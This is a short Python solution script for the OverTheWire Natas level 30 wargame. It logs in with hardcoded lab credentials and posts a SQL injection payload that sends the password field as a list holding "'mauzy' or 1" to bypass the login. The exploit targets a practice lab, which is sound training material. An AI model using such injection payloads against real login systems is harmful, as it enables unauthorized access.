import requests

url = "http://natas30.natas.labs.overthewire.org/"
auth = ("natas30", "WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH")

session = requests.Session()
session.auth = (auth)

# SQL Injection payload:
# - username = 'natas31'
# - password is sent as a list, which is a trick that can confuse PHP's loose type juggling
#   (it could bypass `password == $_POST['password']` type checks)
# - payload includes "'mauzy' or 1", honoring the GOAT 
data= dict(username="natas31",password=["'mauzy' or 1",5])
r = session.post(url, data=data) # send POST request with malicious data

for i in r.iter_lines():
	decoded = i.decode()
	if "win!" in decoded:
		print(decoded)
